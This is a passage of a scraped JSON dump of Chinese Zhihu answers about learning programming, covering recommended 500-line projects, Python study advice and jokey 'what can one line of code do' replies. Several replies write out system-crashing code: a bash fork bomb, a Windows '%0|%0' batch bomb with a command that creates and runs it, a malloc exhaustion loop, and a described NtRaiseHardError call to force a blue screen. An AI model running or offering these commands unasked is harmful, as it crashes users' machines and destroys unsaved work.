MVC模型中的view层如何解析html中的静态变量和简单的语句，如下：&lt;p&gt;Welcome, {name}!&lt;/p&gt;\n&lt;p&gt;Products:&lt;/p&gt;\n&lt;ul&gt;\n{products}\n&lt;/ul&gt;\nweb中的view层不只是html代码，还有支持其他的代码。比如 {products}是一个变量。 同时view层还支持{if} , {for}, {foreach}等等。django，velocity等是如何解析他们的？大牛用不到500行代码告诉你，是如何实现的？ （不是替换，替换需要每次请求都需要解析）2. Web Spreadsheet （http://aosabook.org/en/500L/web-spreadsheet.html）   web的电子表格如何实现的？ 好像比较简单，但是介绍了 web storage 和 web worker，还是很值得一看的3. A Web Crawler http://aosabook.org/en/500L/a-web-crawler-with-asyncio-coroutines.html   不多说，几百行代码实现高效的网络爬虫， 高效！4. Static Analysis http://aosabook.org/en/500L/static-analysis.html     成熟的IDE都有代码检查和代码提示，怎么做的？ 看这章5. Clustering by Consensus http://aosabook.org/en/500L/clustering-by-consensus.html    分布式系统 paxos原理与实现。不知道paxos说明你没接触过分布式体统，接触过分布式还不懂，说明你只会用分布式系统6. A Simple Object Modle http://aosabook.org/en/500L/a-simple-object-model.html    Python是面向对象语言，对象，继承，多态，怎么用代码实现的，不到500行代码，实际不到400 行， 666.。。7. An Archaeology-Inspired Database http://aosabook.org/en/500L/an-archaeology-inspired-database.html    如何用python实现一个数据库，支持 query，index, transaction， 2，3百行代码和对每个函数的讲解。看完你就知道知道数据库原理，太值了8. Dog Bed Database http://aosabook.org/en/500L/dbdb-dog-bed-database.html   类似上一章，不过这次实现的是key-value的非关系型数据库，详细的讲解和2，3百行代码9. A 3D Modeller http://aosabook.org/en/500L/a-3d-modeller.html    用python实现一个3D设计，显示到屏幕，可以交互。不是很懂，但不明觉厉10. A Python Interpreter Written in Python http://aosabook.org/en/500L/a-python-interpreter-written-in-python.html      手把手教你如何实现python解析器。11. A Pedometer in the Real World http://aosabook.org/en/500L/a-pedometer-in-the-real-world.html       你用过手机应用记录你每天走的步数，然后发送到朋友圈吗？ （没有？ 没关系。）这章告诉你如何实现步数记录，怎么算走一步。手机中有加速记，很容易获得你某一时刻在x,y,z三个方向的加速度，用这些参数，如何计算你走了多少步？ 知道吗？ 不知道，看这章，讲解加实现12. A Continuous Intergration System http://aosabook.org/en/500L/a-continuous-integration-system.html      CI System是一个专门用来测试新代码的系统，根据代码提交记录，拿到新的代码，测试，生成报告。这不是关键，关键是 如果test失败，它还会 恢复，然后从失败的那个点在跑，相当于把出错环境重现了。。。13 A Rejection Sampler http://aosabook.org/en/500L/a-rejection-sampler.html      不是很懂，和机器学习相关，如何 计算你赢得象棋比赛的概率，天气对飞机的影响等类似的问题14 A visual programming toolkit http://aosabook.org/en/500L/blockcode-a-visual-programming-toolkit.html      不太明白15.  A Flow Shop Scheduler http://aosabook.org/en/500L/a-flow-shop-scheduler.html      flowshop调度问题，好像很出名的样子，最优化问题，如何从局部最优解找全局最优解16  Optical Character Recognition      几百行代码使用人工神经网络实现识别手写字母。。。github源码：500lines/README.md at master · aosabook/500lines · GitHub", "praise_num": 7613, "answer_object_id": "1f086c0a13d9baab483fe78d5c19c4c1"},{"answer_url": "https://www.zhihu.com/question/284886698/answer/444476682", "answer_id": 444476682, "comments_num": 228, "answer_article": "一行代码足矣。对于window系统，下面的bat脚本就能让机器死机。start cmd ipconfig\n记得在虚机上运行啊            对于linux系统，fork炸弹就行。：（）{ ： | ： &amp; }；：\n同上            不管是哪种，无非是无限次循环，吃尽系统资源，最后让机器宕机。最后说一下这个fork炸弹的原理吧。其实可以这样写：fun()\n{\n  fun | fun &amp; \n};\nfun\n知道啥意思了吧？fun函数里面执行fun本身并创建后台进程，这个&amp;就是指后台运行的意思，这样会导致无限次创建后台进程直到吃完系统资源。", "praise_num": 3036, "answer_object_id": "a41048e330021e1d927372ab7626853b"},{"answer_url": "https://www.zhihu.com/question/284886698/answer/443386741", "answer_id": 443386741, "comments_num": 720, "answer_article": "你这么想死的吗, 不管什么语言什么系统, 反正一行就够了....左下角输入cmd回车, 然后输入 set /p=\"%0|%0\"&lt;nul&gt;s.bat&amp;s\n&lt;img src=\"https://pic3.zhimg.com/50/v2-0f4e8b8d956855eb31c2bf818e101549_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"392\" data-rawheight=\"680\" data-default-watermark-src=\"https://pic1.zhimg.com/50/v2-e15f44bc12c0aa06329a34277eb073db_b.jpg\" class=\"content_image\" width=\"392\"&gt;本来想用 echo 的... 然后我发现我不知道windows下面echo怎么禁掉换行...你要没跳出来cmd, 那新建个txt, 然后输入%0|%0 , 改后缀为bat或者cmd, 然后运行一样可以升天....然后蓝屏重启之后搞不好C盘里还会有成G的名为xxxdump的垃圾...", "praise_num": 6727, "answer_object_id": "e3af4f48f655160eb3f3f2c3e31dd2c2"},{"answer_url": "https://www.zhihu.com/question/285586045/answer/475593167", "answer_id": 475593167, "comments_num": 703, "answer_article": "在Linux下：sudo apt-get install hollywood cmatrix            如果你修电脑，请记得在女生面前展示这一技能，然后装作淡定的快速敲击键盘，相信我，完全好莱坞黑客镜头范，妹子肯定会膜拜死你的！1.讲真的，评论区这么多杠精真的好吗？妹子会不会linux不重要啊，你难道不会做一个盘嘛！学会把机会把握在自己手里啊。2.其次是sorry啊，昨晚我只是脑洞想到这行代码而已，没有考虑到RPM 和DPKG下的使用指令区别。", "praise_num": 6626, "answer_object_id": "6bc94be5aaa5571992b1c9ad5ad627a0"},{"answer_url": "https://www.zhihu.com/question/40801731/answer/203894909", "answer_id": 203894909, "comments_num": 34, "answer_article": "相信对于每个人而言，知道编程和学习编程这件事，出发点是不同的。汤哥在北京接触编程的时间是2013年，那个时候还在一个二线城市上大学，还没有这么多各种融资,各种互联网创业的氛围，大家想的更多的是一些线下的：发个传单、开个小店、进个大企业的思维。第一次感受到互联网神奇的时候是2013年底，一个学长毕业后进入一家互联网企业，一个月收入快1.5万，虽然现在看来不高，但是当时对于一个在二线城市的大学生而言，这样的收入和公司，是可望而不可及的。&lt;img src=\"https://pic3.zhimg.com/v2-15fe466860b4e3cbf25e64d429c5e00a_b.png\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"576\" data-rawheight=\"408\" class=\"origin_image zh-lightbox-thumb\" width=\"576\" data-original=\"https://pic3.zhimg.com/v2-15fe466860b4e3cbf25e64d429c5e00a_r.jpg\"&gt;当然此时也是我开始了解编程并研究编程的，故事就不多说了，我们来开始正解！一、什么样子的人适合学习编程？在大众周围，总是充斥着各种如何学习编程的声音。许多人已经对于是否“每个人都应该学习编程”发表了自己的观点。开句玩笑话：如果那些认为每个人都需要学习编程的作者自己会编程的话，就不会出现程序员紧缺的现象了！其实编程这个事情，很多人有计算机专业相关和非计算机相关的区分，虽然确实有基础底蕴的差别，但是在努力的共性上还是一致的，有以下几个共性，你可以看一看：1. 对编程求知欲，喜欢自己动手探索一些数据或者编程的东西。很多人入行都是听说程序员很赚钱就进来了，不过对程序并没有特别的兴趣，这类人在经历了短暂的培训之后，还是可以基本入行，但是他们基本还是在初级阶段，向中级晋升一般都需要主动性。有兴趣，并且有基础的才会比其他人更进一步。2.善于发现程序问题，并且自己想办法解决。编程最难的一点是找Bug，任何程序出现问题是正常的，关键是你具备发现问题和解决问题的能力。如果你对Bug问题解决能力很强，那么你像优秀程序员的进阶就会很快，3.对编程学习有持久和自学的耐心。很多人说编程跟武功一样，一日不练，武功全废。不能光凭借一时间的兴趣，简单的玩一下，然后问题很多，就问人。这种学习的过程是不科学的，问是可以的，但是最好需要有基本的解决。上面说的是一些通过习惯，有了上面的基础，然后再有英语基础、数学还不错、还是计算机专业，那就非常完美了。二、编程语言有哪些？到底Python作为编程入门语言合适吗？如果你计划开发软件、硬件、甚至操作系统，那么你或许想学习C语言。C语言刚出现的时候是一种伟大的语言，因为很多其他的语言都直接或间接来源于C语言，其中包括 Java、JavaScript、C++、Python、PHP 和 Per。&lt;img src=\"https://pic2.zhimg.com/v2-f98eb6f9ca12459a70f1e10e48910a69_b.png\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"618\" data-rawheight=\"448\" class=\"origin_image zh-lightbox-thumb\" width=\"618\" data-original=\"https://pic2.zhimg.com/v2-f98eb6f9ca12459a70f1e10e48910a69_r.jpg\"&gt;编程初学者应该先写 c 还是Java还是Python？C语言。java我建议做第二个学习的语言，java是面向对象的语言，更贴近人的思考，很多底层帮你封装好了，你不用太关注底层实现。不同语言门槛不同，Python&lt;PHP&lt;JavaScript&lt;Java&lt;C++，C语言是一门基础语言,是其他一些语言的基础,例如MATLAB,Object-C,Lua等.同时也是学习来比较难的语言,达到精通的程度没有3-10年左右很难,C语言没有比较完善的开发框架,他是面前过程的一门语言,讲究算法跟逻辑的.\"python的灵魂不在于语言本身，而在于其诸多优秀的库。Python有能运行的伪代码之称，是最适合初学者学习的语言，是程序员的启蒙语言。当初Guido设计Python的时候，就是为了要设计一种简单易用，能适合教学的编程语言。所以Python的语法简洁清晰，并且在语法中强制性地植入了编程风格。还有一些其他的好评如下：接近英语的简单语法；开发环境简单，能打字就能写代码；众多的第三方库；解释执行，不需要编译；跨平台，方便移植；python是现代语言，具有足够的抽象性，适合教学一些纯数据结构、算法的抽象知识。此外，Python的许多思想都能适用于其他主流的编程语言。因此学通Python，有助于你掌握Java，C#， C++， C等主流的工业编程语言。结论是：作为首选语言没有问题，其他语言还得学。没有最好的语言，只有最合适的语言。没有糟糕的语言，只有糟糕的程序员。没有一种语言是万能的，只会一种语言是万万不能的。用什么语言不重要，最重要的是效率：开发效率和执行效率。不过最后，我想告诉大家。第一门编程语言的学习过程永远是痛苦的。选择Python尽管可以让这个过程变得轻松一些，但是你仍然得克服一系列困难。做为一个程序员，是应该去选取不同思路的语言去学习的，而且当然要选择最有代表性的语言，在编程的世界里，主流的思路其实就两种，一是结构化编程，一是函数化编程，面向对象只是结构化编程进化的一个阶段而已，其他各种各样的思路大多数是这两个的分支。对于非程序员来说，码代码是用来解决问题的，不用纠结底层的东西，能短平快解决问题才是最关键。三、现在都有哪些人在学Python，为什么学？目前在很多行业中都在越来越多的应用Python，这也是很多行业学习Python的原因，Python主要的应用领域有哪些呢？我们来看一看：&lt;img src=\"https://pic3.zhimg.com/v2-e1b77a1f4b6e682cfe4adc05a305e372_b.png\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"739\" data-rawheight=\"439\" class=\"origin_image zh-lightbox-thumb\" width=\"739\" data-original=\"https://pic3.zhimg.com/v2-e1b77a1f4b6e682cfe4adc05a305e372_r.jpg\"&gt;目前来学的人群分为以下几类：第一类：入行编程新手：大学刚毕业或者其他行业转岗，想从事编程开发的工作，目前认为Python比较火，想入行；第二类：Linux系统运维人员：Linux运维以繁杂著称，对人员系统掌握知识的能力要求非常高，那么也就需要一个编程语言能解决自动化的问题，Python开发运维工作是首选，Python运维工资的薪资普遍比Linux运维人员的工资高。第三类：做数据分析或者人工智能：不管是常见的大数据分析或者一般的金融分析、科学分析都比较大程度的应用了数据分析，人工智能的一些常见应用也使用了Python的一些技术。第四类：在职程序员转Python开发：平常只关注div+css这些页面技术，很多时候其实需要与后端开发人员进行交互的，现在有很多Java程序在转到Python语言，他们都被Python代码的优美和开发效率所折服第五类：其他：一些工程师以前在做很多SEO优化的时候，苦于不会编程，一些程序上面的问题，得不到解决，只能做做简单的页面优化。 现在学会Python之后，你和我一样都可以编写一些查询收录，排名，自动生成网络地图的程序，解决棘手的SEO问题当然，这里总结的只是常见的一些情况，关于职业和岗位，之前写过一个内容介绍：四、学习Python编程，我们应该如何学？大概的学习内容包括哪些？我想可能很多网友和我有着相似的学习背景，学习Python会有以下的问题：从零开始，不知道如何下手开始学？被基本的数据结构、设计模式等计算机常识问题难住看了一阵，前面的又忘记了遇到问题不知道怎么如何寻找解决方案学习Python编程语言，动手实践是一件非常愉快的事情，遇到了程序上的问题，经常自己思考研究，从而解决问题，自己的技术水平和解决问题的能力都得到了大大的提升。但是，如果是你零基础起步，自己一点点照着书本学习，遇到困难，得不到解决，长期下去，会对学习编程产生厌恶，最终放弃学习。经历这个Python后，我认为像Python这样的语言确实有学习的必要，因此把我的Python学习笔记贴出来，不过前面部分写的过于基础了。1、第一个Python脚本: hello world 2、Python语言与传统的C++/Java语言显著不同的地方 3、Python语言的控制结构 4、变量声明和定义 5、函数 6、列表、字典、元组 7、字符串处理 8、面向对象编程：封装、继承、虚拟函数、接口、多继承、模板 9、面向对象编程：异常处理最后给想学习Python编程的朋友，一些小建议：1、先买一本自学用的Python书籍，不要看电子书。选择合适的教程。有些书很经典，但未必适合你，书籍有：《Python核心编程》《Python基础编程》《Python学习手册》《Head First Python》《Python编程入门》《Python开发实战》《Python编程初学者指南》。2.对Python基础数据类型有一个了解，学会各种类型的操作方法，了解函数和类的概念。3、学会查官方文档，用好搜索引擎和开发者社区。不但要学写代码，还要学会看代码，更要会调试代码。读懂你自己程序的报错信息。再去找些github上的程序，读懂别人的代码。4、动手实践，找小项目练习。前面几个阶段要快，都是为这个阶段做铺垫，，这时可能遇到各种困难，这时回头复习参考书上对应知识点，同时去谷歌百度，如果自己写不出来也可以参考别人的项目去做点事情，过一阵子对python了解后自己就知道该学啥了，是web开发，还是爬虫，或者数据分析，机器学习。5.除了学习编程语言，也兼顾补一点计算机基础，和英语。&lt;img src=\"https://pic1.zhimg.com/v2-2aec1a30e7622139f00c8d60a6cbb0c0_b.png\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"540\" data-rawheight=\"308\" class=\"origin_image zh-lightbox-thumb\" width=\"540\" data-original=\"https://pic1.zhimg.com/v2-2aec1a30e7622139f00c8d60a6cbb0c0_r.jpg\"&gt;以上是关于学习的一个建议，欢迎大家拍砖和讨论。感觉写的好，对你有帮助，就点个赞呗，别光只收藏哈.~(￣▽￣)~————————你想更深入了解学习Python知识体系，你可以看一下我们花费了一个多月整理了上百小时的几百个知识点体系内容：【超全整理】《Python自动化全能开发从入门到精通》笔记全放送&lt;img src=\"https://pic4.zhimg.com/v2-b695615cbdc3e1241bcb9fe52be050df_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"277\" data-rawheight=\"190\" data-thumbnail=\"https://pic4.zhimg.com/v2-b695615cbdc3e1241bcb9fe52be050df_b.jpg\" class=\"content_image\" width=\"277\"&gt;", "praise_num": 352, "answer_object_id": "7ea52581691fe49925e16f342b44779a"},{"answer_url": "https://www.zhihu.com/question/29372574/answer/192385626", "answer_id": 192385626, "comments_num": 19, "answer_article": "1、自己动手写个Web Server 图文结合，作者非常幽默风趣Let’s Build A Web Server. Part 1Let’s Build A Web Server. Part 2Let’s Build A Web Server. Part 3&lt;img src=\"https://pic2.zhimg.com/v2-1fd5f7a31ecbbe2428c4b05071fc7509_b.png\" data-rawwidth=\"1024\" data-rawheight=\"499\" class=\"origin_image zh-lightbox-thumb\" width=\"1024\" data-original=\"https://pic2.zhimg.com/v2-1fd5f7a31ecbbe2428c4b05071fc7509_r.jpg\"&gt;看英文吃力的看翻译版自己动手开发网络服务器（一）\n 自己动手开发网络服务器（二）\n 自己动手开发网络服务器（三）2、自己动手写个解释器，依然是楼上这位高产作者Let’s Build A Simple Interpreter. Part 1.\nLet’s Build A Simple Interpreter. Part 2.\nLet’s Build A Simple Interpreter. Part 3.\nLet’s Build A Simple Interpreter. Part 4.\nLet’s Build A Simple Interpreter. Part 5.\nLet’s Build A Simple Interpreter. Part 6.\nLet’s Build A Simple Interpreter. Part 7.\nLet’s Build A Simple Interpreter. Part 8.\nLet’s Build A Simple Interpreter. Part 9.\nLet’s Build A Simple Interpreter. Part 10.\nLet’s Build A Simple Interpreter. Part 11.\nLet’s Build A Simple Interpreter. Part 12.\nLet’s Build A Simple Interpreter. Part 13.\nLet’s Build A Simple Interpreter. Part 14.照样有人翻译了《一起来写个简单的解释器（1）》\n《一起来写个简单的解释器（2）》\n《一起来写个简单的解释器（3）》\n《一起来写个简单的解释器（4）》\n《一起来写个简单的解释器（5）》\n《一起来写个简单的解释器（6）》\n《一起来写个简单的解释器（7）》\n《一起来写个简单的解释器（8）》烂尾了.....，还是硬着头皮去看原文吧3、如果觉得上面的太难，来个简单了，写个Django博客Django 博客教程：前言\n1 - 搭建开发环境\n2 - 建立 Django 博客应用\n3 - 创建 Django 博客的数据库模型\n4 - 让 Django 完成翻译：迁移数据库\n5 - Django 博客首页视图\n6 - 真正的 Django 博客首页视图\n7 - 在 Django Admin 后台发布文章\n8 - 博客文章详情页\n9 - 支持 Markdown 语法和代码高亮\n10 - 页面侧边栏：使用自定义模板标签\n11 - 分类与归档\n12 - 评论\n13 - 已知小问题修正\n14 - 使用 Nginx 和 Gunicorn 部署 Django 博客\n15 - 使用 Fabric 自动化部署4、如果以上都觉得太无趣，写个爬虫获取能激发你的学习动力，爬网上的在线教程做成电子书https://foofish.net/python-crawler-html2pdf.html&lt;img src=\"https://pic3.zhimg.com/v2-c0982b8c856269a86112cc0de8a5312a_b.png\" data-rawwidth=\"708\" data-rawheight=\"518\" class=\"origin_image zh-lightbox-thumb\" width=\"708\" data-original=\"https://pic3.zhimg.com/v2-c0982b8c856269a86112cc0de8a5312a_r.jpg\"&gt;5、大家都喜欢玩微信，如果用Python来微信，搞个机器人调戏一下妹纸什么的更有意思wxpy: 用 Python 玩微信，可能是最优雅的微信个人号 API&lt;img src=\"https://pic4.zhimg.com/v2-bc52af27d05d1036fe520b17a9bc50c3_b.png\" data-rawwidth=\"750\" data-rawheight=\"1334\" class=\"origin_image zh-lightbox-thumb\" width=\"750\" data-original=\"https://pic4.zhimg.com/v2-bc52af27d05d1036fe520b17a9bc50c3_r.jpg\"&gt;图片来源：biezhi/wechat-robot", "praise_num": 1082, "answer_object_id": "ba7a3279e3e0f7ad2062a30f8845cb3f"},{"answer_url": "https://www.zhihu.com/question/284886698/answer/444793817", "answer_id": 444793817, "comments_num": 20, "answer_article": "@vczh 的办法没必要，还要写驱动，还要骗 admin 装。其实调用 RtlAdjustPrivilege 提权拿到 SeShutdownPrivilege，然后调用 NtRaiseHardError 在 ResponseOption 里传入 OptionShutdownSystem 就可以发起蓝屏，连 UAC 都不会弹。刚在 Windows 10 1803 里测试过可行。", "praise_num": 186, "answer_object_id": "03750d2490e8bb860edcfccfeb42d3c4"},{"answer_url": "https://www.zhihu.com/question/285586045/answer/450054820", "answer_id": 450054820, "comments_num": 43, "answer_article": "代码都是层层抽象的，那么你问一行可以干什么，说不定可以模拟一个世界generateWorld()如果抽象不算，从汇编开始算的话，一行还真干不了什么", "praise_num": 888, "answer_object_id": "2071fa877a706ada6de224739c23e2fe"},{"answer_url": "https://www.zhihu.com/question/285586045/answer/457806145", "answer_id": 457806145, "comments_num": 16, "answer_article": "可以试试 Python 的 from stackoverflow import ... 一个脑洞大开的项目， 会自动导入 Stack Overflow 上该关键字的高票回答里能跑起来的代码，而且通常情况下真的是可用的。&gt;&gt;&gt; from stackoverflow import quick_sort, split_into_chunks\n&gt;&gt;&gt; print(quick_sort.sort([1, 3, 2, 5, 4]))\n[1, 2, 3, 4, 5]\n&gt;&gt;&gt; print(list(split_into_chunks.chunk(\"very good chunk func\")))\n['very ', 'good ', 'chunk', ' func']\n&gt;&gt;&gt; print(\"I wonder who made this\", split_into_chunks.__author__)\nI wonder who made this https://stackoverflow.com/a/35107113\n&gt;&gt;&gt; print(\"but what's the license?\", quick_sort.__license__)\nbut what's the license? CC BY-SA 3.0\n&gt;&gt;&gt; assert(\"nice, attribution!\")\ndrathier/stack-overflow-import​github.com", "praise_num": 393, "answer_object_id": "13385367ce88b0277098f612e8fb36de"},{"answer_url": "https://www.zhihu.com/question/285586045/answer/475255922", "answer_id": 475255922, "comments_num": 88, "answer_article": "一行代码能带你开车，只要以如下开头“magnet:?xt=urn:btih:”", "praise_num": 515, "answer_object_id": "0f78ad9b69d87ed8670f840528f5156d"},{"answer_url": "https://www.zhihu.com/question/40801731/answer/95287246", "answer_id": 95287246, "comments_num": 77, "answer_article": "2016-6-17更新----------------学 Python！学 Python！学 Python！我觉得我应该有资格聊聊这个问题。而且我不会聊关于语言的优劣，而是关于一个人能力和决心的问题。我本科是商科，在学校没有上过一节关于编程的课，数学到线性代数就没学了，而且我感觉自己这门还学得不算好。13年毕业后一直到15年底才正式进入互联网公司，全职开始编程。 进入公司半年不到，现在开始自己立项目，负责搭建团队。毕业前2年，都是在传统行业，工作中没有任何涉及到编程的事情。从13年开始，我自己学了下Python。一开始主要是对政治方面很感兴趣，爬下了中国领导干部资料库所有资料，做了下关于领导人出生年月的统计分析。（PS爬虫项目强烈推荐这个网站，没有任何限制，新手村专用）后来又自己做了几个小项目，懂得了怎么爬取数据，解析网页，和存到数据库。 凭着这些能力和大学中学得一些统计相关的课程，进入了一家互联网公司做数据挖掘和爬虫相关的工作。进入公司几个月之后，明显感觉我和一些用Java的同事的不同（不是全部）。 我学得更快，Python我是自己学的，我懂怎么在没有老师的教导下获取信息，达到目的。我做得更主动，公司有些Java同事，往往是被需求赶着的生物，推一步才走一步，有时候还根本推不动。 而我在需求没来之前，自己就去发现需求，自己就去提前满足没被提出来的需求。 （我觉得人如果太被动，就容易进入舒适区，无法更好的学习。主动学得更快。）后来因为我满足了某些老板很看重的需求，所以让我来建立团队满足这部分更大的需求。然后我招人，照样也只招Python的， 并不是因为我只会Python,这几月里面Java入了门，C#也会了不少。而是用Python的程序员天生和会国内主流语言的程序员不一样。Python因为在中国市场不旺，所以导致培训机构不热衷开设这部分的班级，而且这门语言在中国大学没有做到像Java,C++那样普及。 所有会Python的程序员都是自学的，会Python本身就证明你有能力独立解决问题，有能力快速的成长。 招进来的人，都能很快的达到预期效果，这是大部分Java程序员做不到的。 （我并不是说全部，一部分Java程序员，可能学习能力更强。不过筛选成本比Python高）所以你作为Python 程序员，在现在就有了天然的标签，你会学习，你懂学习，你能独立解决问题。这是大部分公司需要的。 有这些标签，为什么要去首先学那些国内的主流语言？（国际上Python也是主流语言）如果你说是为了更好的找工作，我可以和你说Python在某些方面更有竞争力。我最近在招Python工程师，基本上是来一个简历我要看一下。（因为太少了） 而我们公司其他项目找的Java工程师，同事说简历根本看不完。可能你会说我们公司是特例，事实上Python工程师出名的难招。很多公司因此把项目改成了Java。国内很多基于python的网站开始招聘java工程师，原因是什么？ - Java他们不想要会Python的工程师吗？ 不，仅仅是太太太太太难招了。最后再说Python最快入门转行攻略。学爬虫。2个星期入门， 6个星期搞清楚爬去，解析，录入数据库的流程，加多个项目。 你就准备好跳吧。需求？ 旺盛到爆。------------------------2016-04-14------------------今天才和女神约会完，正好有时间就谈谈怎么入门吧。如果觉得有帮助请祝福我能追到女神哈哈。我是零基础入门的，所以我懂最初的恐惧是什么。 什么都不懂，根本不知道怎么入手。其实我们最大的恐惧是怕失败， 然后编程根本就是一个持续失败的游戏，你只要对一次，你的程序就跑得通了，你就完成了一个雏形。所以第一步就是克服自己的恐惧，心理要有一个概念，编程本身是一件试错的事情，因为马上可以得到答案，所以试错成本非常低。 我们都是在犯错，所以没必要害怕失败。不怕了以后就可以开始写程序了，我一开始也是对程序各种搞不懂，被各种概念搞得头昏眼花，我现在觉得编程其实就是一个概念，如果懂得这个概念，其他的东西都可以套入进来。 这个概念就是，一个程序由3个部分组成。  输入，运算，和输出。具体例子例子就是 \ny = x + 1x为输入， y为输出。   x+1为运算。  这就是一个程序通过这个程序，你可以输入无数个不同的变量，通过运算，得到输出（结果）如果你想用python来显示其实也差不多# x是输入变量，y是输出，整个cal程序是运算\ndef cal(x):\n    y = x + 1\n    return y\nps: 输入和输出其实有些时候可以没有，不过一开始都可以认为是必须的。当你了解这个概念的时候，其实你就懂编程了，因为每个完整的程序，是由很多个小程序组成的，也就说，不管一个系统多么复杂，都是一个个小的程序在运作的。  所以这也是为什么很多人说如何编程的方法：把一个大的程序，分割成无数个小的程序，一步一步来解决。比如说以想爬一个网站，也是分成很多步骤， 第一步访问，第二步把整个页面的xml 下载下来，第三部解析提取自己想要的数据， 第四部储存下来，第五步解决异常，第六步创建消息队列，第七步分配线程池 等等等等。 一步步来每一步很具体的去stackoverflow查问题，你会发现真心不难。当你做到这点的时候，你会发现没什么难的，你已经入门了 现在就说一句 hello world, 开始你的魔法旅程吧。如果我追到了女神，我会来更新如何在让上级信任你，让你负责一个项目。 也就是如何成为不可或缺的人。---------------------2016-6-17------------最后打个广告，深圳地区，长期招聘Python爬虫工程师，征信相关的大数据项目。不看经验，不看背景。 只看做过什么项目。有兴趣的请私信我。", "praise_num": 381, "answer_object_id": "9bdb6b2dfd03949b8cc40a059960be20"},{"answer_url": "https://www.zhihu.com/question/29372574/answer/346927368", "answer_id": 346927368, "comments_num": 7, "answer_article": "回答中提到的资源，都可以在公众号 Crossin的编程教室 中找到。也欢迎关注我们的专栏 Crossin的编程教室，我们将持续更新适合各阶段的练手项目。1. 新手学习阶段编程从一开始就离不开练手，光靠看是不可能看会的。这个阶段最好的方式就是把教程上的例程全部手动输入并成功运行一遍。不要小瞧这个看似很笨的操作，它很重要。只有你自己在电脑上一行行代码敲过，才会发现其中你没有注意到的细节问题，进而有更深刻的理解。大多数情况，你开始自以为原样照抄的代码，就是会有各种报错。这时候你不得不去仔细对比，关注每个细节。对于Python来说，缩进、大小写、括号、引号、代码执行的方式等等，都会是早期的坑。所以切记：不要运行现成的代码，不要直接复制，一定要手动建项目、敲代码、运行。不同的教程会有不同的风格，适合不同的学习者，但相同的一点是里面的例子代码都很重要，甚至我觉得比文字更重要（比如有名的《笨办法学Python》就完全以习题为主）。因此当你选定一本教程之后，务必把其中的例子从头到尾做一遍。以我自己的《Python零基础入门教程》为例：Crossin的编程教室 - Python入门在课程中除了基本的讲解外，还配了一些小案例，如：猜数字 - random罚点球小游戏统计分数 - 文件处理查天气2. 了解基本语法后这时候，你会写代码，但可能还无法掌握“编程思维”。因此需要更多的不同练习，来理解程序的结构、逻辑等。为此，我们专门开辟了一个栏目，定期更新一些小题目供学习者练手。现有的一些题目：替换文件中的敏感信息 黑色星期五 特殊的生日 注册表单验证 数路径 缩小图片尺寸 谁是哪国人？ 矩阵旋转 阿姆斯特朗数 美队盾牌 罗马数字转换 螺旋矩阵 校验文件哈希 验证哥德巴赫猜想 杨辉三角形 神奇的九宫格 求乘积最大 程序猿的浪漫 田忌赛马 乒乓数 囚徒困境 选择困难的农药召唤师 生成词云 特殊回文数统计英文小说词频 双色球选号器 三门问题 记账本 让程序替你等待 3道练习题 查找文件内容 文字竖排查找文件每一期里面会有上一期的解答。在微信里打开可以看到其他同学提交的解答。3. 掌握语言基础后经过一定时间的学习，写过一些小的程序之后，学习者往往会陷入瓶颈：这时候会写代码会做题，但对于真实的软件开发依然缺少认识，一旦程序规模较大就无从下手。在这个阶段，需要有较明确的开发目标，并且对目标做一定的设计和功能划分，然后逐步开发直至完成。这其中会遇到各种问题，在不断解决问题时，你的开发水平和问题解决能力也将随之得到提高。对此，我们制作了一些开发案例，提供问题、解决思路和参考实现。有些案例我们在专栏里也分享过。例如：招聘职位分析电影票比价网寻找押韵词汇IP代理池背单词 - Python高频词汇扫码入库(小程序+django)贪吃蛇大作战声控游戏“皮皮虾，我们走！”此级别的案例基本可以算作完整的个人项目，甚至达到小的商业项目标准。比如就有人看到上述项目后就联系定制开发，而我们之前的读者也有不少在完成类似项目后拿到了满意的工作offer。编程是个理论与实践相结合的事情，并且实践更重要。从简单的程序开始，坚持练习。不要着急，欲速则不达。也不用太在意你做的项目本身是不是够酷炫够高大上。对学习阶段来说，不管好项目坏项目，只要是在写，都不浪费。当你的代码行数积累的一定程度时，你会发现自己的编程能力已经和当年不是一个档次了。其他编程方面的回答和文章：新手引导 | 学编程的弯路 | 如何自学Python | 知乎学Python欢迎关注：Crossin的编程教室（crossincode）", "praise_num": 415, "answer_object_id": "230adfdfc6aea48fa7265d78c1305b4d"},{"answer_url": "https://www.zhihu.com/question/284886698/answer/443395634", "answer_id": 443395634, "comments_num": 44, "answer_article": "一行，fork炸弹，原理是不断fork新的进程，占用系统的cpu和内存资源，但不是总能成功，比如内核会将整个进程树干掉。:(){:|:&amp;};:\nwindows下：%0 | %0\n64位下，原理是64位有2^64字节虚拟内存，这远超过实际内存，所以下面循环执行到内存不够的时候，内核会调度swap分区（windows下对应swap文件），从而占光cpu和内存资源，同时也会卡磁盘io。未必一定成功，超出设定的交换分区大小上限后可能被内核干掉。while(malloc(1))\n==============update================对评论区的统一回复，有人质疑while(malloc(1))的可行性，但由于大部分回复都靠不住脚，所以我本人也没有详细验证。32位下是没有这个效果的，经测试64位下在卡顿一段时间之后会被内核干掉分配时间很慢，这个是不存在的，malloc底层有sbrk包着，每满一个页，glibc才会向下調一次系统调用，而经测试，从程序运行到系统全部内存和swap被占用只要几秒钟写时分配，经测试内存还是会被占满，看来写时分配没有起作用内存压缩，我没有研究过这一块的论文，不过按我的理解，内存压缩应该是处理不了堆区内存的，如果大佬了解这一块，方便贴个出处。最后是截图：&lt;img src=\"https://pic2.zhimg.com/v2-8a28fd3cc75b60e90ba9f5245d57488d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1366\" data-rawheight=\"768\" data-default-watermark-src=\"https://pic1.zhimg.com/v2-8b2e6dc5fe32a68f66b7301ac5924128_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1366\" data-original=\"https://pic2.zhimg.com/v2-8a28fd3cc75b60e90ba9f5245d57488d_r.jpg\"&gt;这是卡死前截到的图，源码中的while(1)不起实际作用，经测试，在卡死之后几秒钟内，这个程序会被内核kill掉。", "praise_num": 362, "answer_object_id": "7932f28b17c46e9e73f77b151b9b55f4"},{"answer_url": "https://www.zhihu.com/question/285586045/answer/475364790", "answer_id": 475364790, "comments_num": 100, "answer_article": 